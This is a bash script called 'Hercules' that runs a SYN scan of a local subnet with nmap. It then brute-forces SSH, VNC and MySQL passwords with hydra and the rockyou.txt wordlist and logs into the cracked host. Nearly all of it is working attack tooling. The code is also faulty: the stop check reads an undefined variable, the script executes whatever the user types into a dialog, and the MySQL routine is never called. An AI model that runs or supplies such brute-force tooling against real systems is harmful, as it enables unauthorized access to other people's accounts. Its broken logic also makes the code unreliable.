#!/bin/bash

#url to see if the user is connected to the internet
SITE="https://google.com/"

# Root user
root=0

#checks if the computer is on MAC OS
OS="linux"

# user name and hostname popup prompts text
userName="Input Username:"
hostName="Input Hostname:"

#exit array
exit=("exit" "quit" "EXIT" "QUIT" "STOP" "stop")

# Gets the current time in a 12-hour format
CURRENT_TIME=$(date +"%I:%M:%S %p")

# Gets current date in mm/dd/yyyy format
CURRENT_DATE=$(date +"%m/%d/%Y")

# the packages for the program to work correctly
required_packages=("wget" "nmap" "hydra" "ssh" "mysql")

# Function to check if a command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}


# Check for required packages
for package in "${required_packages[@]}"; do
  if ! command_exists "$package"; then
    echo -e "ERROR: The required package ${GREEN}'$package'${NC} is not installed. Please install it and try again."
    exit 1
  fi
done

# Check if the script is run with --help or -h
if [ "$1" = "--help" ] || [ "$1" = "-h" ]; then
    #to tell the user that the HELP fucniton is working
    figlet "? HELP ?"

    # popup of the programs that are used
    zenity --info \
    --title="? HELP ?" \
    --text="+++++++++++++++Programs used+++++++++++++++
This program will help you crack passwords
It has two programs inside it, one is Hydra and the other is Nmap" \
    --width=400

    # popup of how to use the program
    zenity --info \
    --title="? HELP ?" \
    --text="+++++++++++++++How to use++++++++++++++++++
To use the program you have to tell the computer what port you want to scan.
It will then scan the port that you asked for on the network and see if any ports that you asked are open.
If there are any ports that are open, it will ask for a username and hostname.
When you give the program the username and hostname, it will try to crack that given parameters you gave it." \
    --width=400

else
    if [[ "$OSTYPE" == "${OS}"* ]]; then
        # checks if the user is in root mode or not
        if [[ $EUID -ne $root ]]; then
            title="NOT ROOT"
            message="TIME:${CURRENT_TIME} Please run as root. DATE:${CURRENT_DATE}"
            # Error message if not running as root
            echo "ERROR:TIME:${CURRENT_TIME} Please run as root. DATE:${CURRENT_DATE}" >> ERROR.LOG
            
            zenity --error --title="${title}" --text="${message}"
            exit

        else
            # Try to connect to the server
            wget -q --spider "${SITE}"
            
            # If the user is connected to the internet, it works as normal
            if [[ $? -eq 0 ]]; then
                clear
            
            # Else, it notifies them that they are not connected to the internet and tells them to connect to the internet again
            else
                offlineTitle="offline"
                offline="TIME:${CURRENT_TIME} You are offline. Please connect to the internet. DATE:${CURRENT_DATE}"
                zenity --warning --title="${offlineTitle}" --text="${offline}"
                exit 1
            fi
            clear

            # Tells the user if they want to crack the ports that are listed in the prompt or have help if they are stuck on what to do
            Hercules(){
                figlet -f slant "Hercules"

                # Display a message explaining the options
                options_text="Type the number of the port you want to scan (SSH - 22, VNC - 5900, MySQL - 3306). To scan all, type 'ALL'\nIf you want to stop the program, type 'stop'."

                # Show an entry dialog to get user input for the ports from the network
                service=$(zenity --entry --title "Hercules" --text "$options_text" --entry-text "")
                
                #tells the user what port they are scanning if they forget they can go back to the terminal and it will tell them
                echo -e "[+]The port you are scanning is: ${service}"
                
                # Check the user's input and take appropriate action
                if [[ "$service" == "ALL" || "$service" == "all" ]]; then
                    
                    zenity --info --title "Hercules" --text "Scanning all ports. This may take up to 1 hour to complete." --timeout=5
                    
                    sudo nmap -sS 192.168.1.1/24 -Pn -oN scan.txt --open
                    hydra -h
                    
                    # tell the user info about what to input Hydra first for the program to work correctly
                    zenity --info --title "INFO" --text "Put in Hydra first to start the script." --timeout=5
                    
                    hydraInputFeild="Put in Hydra first to start the script." 
                    GUI_HYDRA=$(zenity --entry --title "hydra" --text "$hydraInputFeild" --entry-text "")

                    #stops the program if the user inputs "STOP" in the hydra array
                    if [[ " ${exit[*]} " == *" ${hydra} "* ]]; then
                        zenity --info --title "Hercules" --text "Stopping program."
                        exit 1
                    else
                        $GUI_HYDRA
                        exit 1
                    fi
                
                #stops the program
                elif [[ " ${exit[*]} " == *" ${service} "* ]]; then
                    zenity --info --title "Hercules" --text "Stopping program."
                    exit 1
                
                # if the users puts nothing into the input feild it says ERROR
                elif [[ "${service}" == "" ]]; then
                    zenity --error --title "ERROR" --text "plase input a number into the input field"
                    Hercules
                
                #scans a port that you choose
                else
                    zenity --info --title "Hercules" --text "Scanning port ${service}." --timeout=5
                    sudo nmap -sS 192.168.1.1/24 -p $service --open
                fi
            }

            RunHackingCommand(){
                zenity --info --title="Hacking command" --text="To crack VNC(5900), don't type anything in the 'Input Username' prompt \nTo crack MySQL(3306), type 'localhost' in the 'Input Hostname' prompt"
                user=$(zenity --entry --title "UserName" --text "$userName" --entry-text "")
                host=$(zenity --entry --title "HostName" --text "$hostName" --entry-text "")
            }
            
            RunHackingCommandWithVNC() {
                if [[ $service == 5900 || $service == "VNC" ]]; then
                    # Checks if the user has put anything in the 'Input Username' function and the hostname function
                    # If not, it will prompt the user to enter the username and hostname
                    if [[ $user == "" && $host == "" || $host == "" ]]; then
                        # No service specified, re-prompt for input
                        zenity --info --title="SERVICE" --text="No service specified"
                        Hercules
                    
                    # If the user inputs something in the 'Input Username' function and the hostname function,
                    # It will continue as normal
                    else
                        # Crack VNC password
                        hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host
                        
                        # Alerts the user that the computer is trying to connect to the VNC server
                        title="Connecting to ${host}"
                        Connecting_To_VNC_SERVER="We are connecting you to '${host}'. Please wait..."
                        zenity --info --title="${title}" --text="${Connecting_To_VNC_SERVER}"

                        sleep 5

                        # It connects to the ssh server and asks for the user to input a password to connect to the ssh server
                        # Notification for the user to see the computer is connected to the VNC server
                        title="Enter password to ${host}"
                        Connected_To_VNC_SERVER="We have connected you to '${host}'. Please enter the password to '${host}'. To continue..."
                        zenity --info --title="${title}" --text="${Connected_To_VNC_SERVER}"

                        xtightvncviewer "${host}"
                        exit 1
                    fi
                fi
            }
            
            RunHackingCommandWithSSH(){
                if [[ $service == 22 || $service == "SSH" ]]; then
                    # Checks if the user has put anything in the 'Input Username' function and the hostname function
                    # If not, it will prompt the user to enter the username and hostname
                    if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
                        # No service specified, re-prompt for input
                        zenity --info --title="SERVICE" --text="No service specified"
                        Hercules
                    else
                        # Cracks SSH Passwords
                        hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host
                        # Alerts the user that the computer is trying to connect to the ssh server
                        title="Connecting to ${user}"
                        Connecting_To_SSH_SERVER="We are connecting you to ${user}. Please wait..."
                        zenity --info --title="${title}" --text="${Connecting_To_SSH_SERVER}"
                        
                        sleep 5
                        # It connects to the ssh server and asks for the user to input a password to connect to the ssh server
                        title="Enter password to ${user}"
                        Connected_To_SSH_SERVER="We have connected you to ${user}. Please enter the password to ${user} to continue..."
                        zenity --info --title="${title}" --text="${Connected_To_SSH_SERVER}"

                        ssh $user@$host
                    fi
                fi
            }

            RunHackingCommandWithMySQL(){
                if [[ $service == 3306 || $service == "mysql" ]]; then
                    # Checks if the user has put anything in the 'Input Username' function and the hostname function
                    # If not, it will prompt the user to enter the username and hostname
                    if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
                        # No service specified, re-prompt for input
                        zenity --info --title="SERVICE" --text="No service specified"
                        Hercules
                        # If the user inputs something in the 'Input Username' function and the hostname function,
                        # it will continue as normal

                    else
                        # Cracks MySQL passwords
                        hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host
                        #puts a popup saying that the computer is trying to connect to a mysql server
                        title="Connecting to ${user}"
                        Connecting_To_MySQL_SERVER="We are connecting you to ${host}. Please wait..."
                        zenity --info --title="${title}" --text="${Connecting_To_MySQL_SERVER}"

                        sleep 3
                        mysql -u $user -p -A
                    fi
                fi
            }

            Hercules # Calls the Hercules function
            
            RunHackingCommand # Calls the RunHackingCommand function

            RunHackingCommandWithVNC # Calls the RunHackingCommandWithVNC function

            RunHackingCommandWithSSH # Calls the RunHackingCommandWithSSH function
        fi
    else
        clear
        # Warning message for wrong OS
        echo "WARNING:TIME:$CURRENT_TIME Wrong OS. Please use the correct OS. DATE:$CURRENT_DATE" >> ERROR.LOG
        zenity --warning --title="WRONG OS" --text="TIME:$CURRENT_TIME Wrong OS. Please use the correct OS. DATE:$CURRENT_DATE"
    fi
fi